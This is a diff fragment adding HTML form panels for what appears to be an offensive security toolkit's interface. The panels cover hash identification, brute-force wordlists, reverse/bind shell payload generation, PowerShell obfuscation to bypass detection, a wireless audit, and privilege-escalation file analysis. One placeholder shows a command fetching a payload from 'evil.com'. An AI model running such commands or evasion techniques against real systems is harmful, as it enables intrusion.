+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="offensive-hash-input">Hash</label>
+                        <input type="text" id="offensive-hash-input" placeholder="e.g. 5f4dcc3b5aa765d61d8327deb882cf99">
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-hash">Identify Hash</button>
+                </div>
+                <div class="output-block" id="output-offensive-hash">
+                    <div class="empty-state">Enter a hash to identify its type.</div>
+                </div>
+            </section>
+
+            <!-- Password Strength Panel -->
+            <section class="panel" id="panel-offensive-password">
+                <div class="panel-header">
+                    <h1>Password Strength Analysis</h1>
+                    <p class="subtitle">Analyze password entropy and crack resistance</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="offensive-password-input">Password</label>
+                        <input type="text" id="offensive-password-input" placeholder="e.g. CorrectHorseBatteryStaple">
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-password">Analyze Strength</button>
+                </div>
+                <div class="output-block" id="output-offensive-password">
+                    <div class="empty-state">Enter a password to analyze its strength.</div>
+                </div>
+            </section>
+
+            <!-- Gen Wordlist Panel -->
+            <section class="panel" id="panel-offensive-wordlist">
+                <div class="panel-header">
+                    <h1>Generate Wordlist</h1>
+                    <p class="subtitle">Generate a targeted wordlist for brute-force attacks</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="offensive-wordlist-target">Target</label>
+                        <input type="text" id="offensive-wordlist-target" placeholder="e.g. company-name">
+                    </div>
+                    <div class="form-group">
+                        <label for="offensive-wordlist-company">Company <span class="optional">(optional)</span></label>
+                        <input type="text" id="offensive-wordlist-company" placeholder="e.g. Acme Corp">
+                    </div>
+                    <div class="form-group">
+                        <label for="offensive-wordlist-year">Year <span class="optional">(optional)</span></label>
+                        <input type="text" id="offensive-wordlist-year" placeholder="e.g. 2025">
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-wordlist">Generate Wordlist</button>
+                </div>
+                <div class="output-block" id="output-offensive-wordlist">
+                    <div class="empty-state">Enter a target and click Generate.</div>
+                </div>
+            </section>
+
+            <!-- Gen Shell Payload Panel -->
+            <section class="panel" id="panel-offensive-shell">
+                <div class="panel-header">
+                    <h1>Generate Shell Payload</h1>
+                    <p class="subtitle">Generate a reverse/bind shell payload</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="offensive-shell-type">Shell Type</label>
+                        <select id="offensive-shell-type">
+                            <option value="bash">bash</option>
+                            <option value="netcat">netcat</option>
+                            <option value="python">python</option>
+                            <option value="perl">perl</option>
+                            <option value="ruby">ruby</option>
+                            <option value="php">php</option>
+                            <option value="tcp">tcp</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="offensive-shell-lhost">LHOST</label>
+                        <input type="text" id="offensive-shell-lhost" placeholder="e.g. 10.0.0.1">
+                    </div>
+                    <div class="form-group">
+                        <label for="offensive-shell-lport">LPORT</label>
+                        <input type="number" id="offensive-shell-lport" placeholder="e.g. 4444" min="1" max="65535">
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-shell">Generate Payload</button>
+                </div>
+                <div class="output-block" id="output-offensive-shell">
+                    <div class="empty-state">Select shell type and enter LHOST/LPORT.</div>
+                </div>
+            </section>
+
+            <!-- Analyze Payload Panel -->
+            <section class="panel" id="panel-offensive-payload">
+                <div class="panel-header">
+                    <h1>Analyze Payload</h1>
+                    <p class="subtitle">Analyze a payload for shellcode patterns and detection risk</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="offensive-payload-input">Payload</label>
+                        <textarea id="offensive-payload-input" rows="3" placeholder="Enter shellcode or payload bytes..."></textarea>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-payload">Analyze Payload</button>
+                </div>
+                <div class="output-block" id="output-offensive-payload">
+                    <div class="empty-state">Enter a payload to analyze.</div>
+                </div>
+            </section>
+
+            <!-- PS Obfuscation Panel -->
+            <section class="panel" id="panel-offensive-evasion">
+                <div class="panel-header">
+                    <h1>PowerShell Obfuscation</h1>
+                    <p class="subtitle">Apply PowerShell obfuscation techniques to bypass detection</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="offensive-evasion-command">PowerShell Command</label>
+                        <textarea id="offensive-evasion-command" rows="3" placeholder="e.g. Invoke-WebRequest -Uri http://evil.com/payload.ps1"></textarea>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-evasion">Obfuscate</button>
+                </div>
+                <div class="output-block" id="output-offensive-evasion">
+                    <div class="empty-state">Enter a PowerShell command to obfuscate.</div>
+                </div>
+            </section>
+
+            <!-- Wireless Audit Panel -->
+            <section class="panel" id="panel-offensive-wireless">
+                <div class="panel-header">
+                    <h1>Wireless Network Audit</h1>
+                    <p class="subtitle">Audit wireless network security configuration</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="offensive-wifi-essid">ESSID (Network Name)</label>
+                        <input type="text" id="offensive-wifi-essid" placeholder="e.g. MyNetwork">
+                    </div>
+                    <div class="form-group">
+                        <label for="offensive-wifi-security">Security Protocol</label>
+                        <select id="offensive-wifi-security">
+                            <option value="open">open</option>
+                            <option value="wep">wep</option>
+                            <option value="wpa">wpa</option>
+                            <option value="wpa2" selected>wpa2</option>
+                            <option value="wpa3">wpa3</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="offensive-wifi-encryption">Encryption</label>
+                        <select id="offensive-wifi-encryption">
+                            <option value="none">none</option>
+                            <option value="wep">wep</option>
+                            <option value="tkip">tkip</option>
+                            <option value="aes" selected>aes</option>
+                            <option value="ccmp">ccmp</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-wireless">Audit WiFi</button>
+                </div>
+                <div class="output-block" id="output-offensive-wireless">
+                    <div class="empty-state">Configure network details and click Audit.</div>
+                </div>
+            </section>
+
+            <!-- Post-Exploit Panel -->
+            <section class="panel" id="panel-offensive-postexploit">
+                <div class="panel-header">
+                    <h1>Post-Exploitation Analysis</h1>
+                    <p class="subtitle">Analyze passwd/sudoers files for privilege escalation indicators</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="offensive-postexploit-mode">Analysis Mode</label>
+                        <select id="offensive-postexploit-mode">
+                            <option value="passwd">/etc/passwd analysis</option>
+                            <option value="sudoers">sudoers analysis</option>
+                        </select>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="offensive-postexploit-input">File Path or Content</label>
+                        <textarea id="offensive-postexploit-input" rows="4" placeholder="Paste file content or provide path (e.g. /etc/passwd)"></textarea>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-offensive-postexploit">Analyze</button>
+                </div>
+                <div class="output-block" id="output-offensive-postexploit">
+                    <div class="empty-state">Provide file content or path and click Analyze.</div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script src="renderer.js"></script>
+</body>
+</html>
